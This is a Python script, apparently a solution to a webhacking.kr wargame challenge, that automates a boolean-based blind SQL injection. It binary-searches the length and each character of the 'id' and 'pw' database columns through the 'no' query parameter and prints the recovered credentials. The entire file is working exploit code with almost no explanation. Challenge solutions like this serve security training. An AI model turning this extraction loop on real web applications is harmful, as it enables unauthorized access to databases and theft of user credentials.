import requests
import sys

url = 'http://webhacking.kr/challenge/bonus/bonus-1/index.php'
payloads = {
	'no': '',
	'id': '',
	'pw': ''
}
cookies = {
	'PHPSESSID': ''
}
for no in range(1, 3):
	# Guess the length of id.
	low, high= 0, 128
	while True:
		mid = int((low + high) / 2)
		sqli = '%d AND length(id) < %d' % (no, mid)
		print(sqli)
		payloads['no'] = sqli
		res = requests.get(url, cookies=cookies, params=payloads)
		if res.text.find('True') > -1:
			high = mid
		elif res.text.find('False') > -1:
			low = mid
		else:
			print('Can\'t inject...')
			sys.exit()

		if high - low <= 1:
			break

	len_of_id = low

	print('The length of the id is ', len_of_id)

	id_name = ''
	# Guess the id.
	for i in range(len_of_id+1):
		low, high = 0, 127
		while True:
			mid = int((low + high) / 2)
			sqli = '%d AND ascii(substr(id,%d,1)) < %d' % (no, i, mid)
			print(sqli)
			payloads['no'] = sqli
			res = requests.get(url, cookies=cookies, params=payloads)
			if res.text.find('True') > -1:
				high = mid
			elif res.text.find('False') > -1:
				low = mid
			else:
				print('Can\'t inject...')
				sys.exit()

			if high - low <= 1:
				break

		id_name += chr(low)
		print(id_name)

	# Guess the length of pw.
	low, high= 0, 128
	while True:
		mid = int((low + high) / 2)
		sqli = '%d AND length(pw) < %d' % (no, mid)
		print(sqli)
		payloads['no'] = sqli
		res = requests.get(url, cookies=cookies, params=payloads)
		if res.text.find('True') > -1:
			high = mid
		elif res.text.find('False') > -1:
			low = mid
		else:
			print('Can\'t inject...')
			sys.exit()

		if high - low <= 1:
			break

	len_of_pw = low

	print('The length of the pw is ', len_of_pw)

	pw = ''
	# Guess the pw.
	for i in range(len_of_pw+1):
		low, high = 0, 127
		while True:
			mid = int((low + high) / 2)
			sqli = '%d AND ascii(substr(pw,%d,1)) < %d' % (no, i, mid)
			print(sqli)
			payloads['no'] = sqli
			res = requests.get(url, cookies=cookies, params=payloads)
			if res.text.find('True') > -1:
				high = mid
			elif res.text.find('False') > -1:
				low = mid
			else:
				print('Can\'t inject...')
				sys.exit()

			if high - low <= 1:
				break

		pw += chr(low)
		print(pw)
	
	print('no:', no, 'id:', id_name, 'pw:', pw)
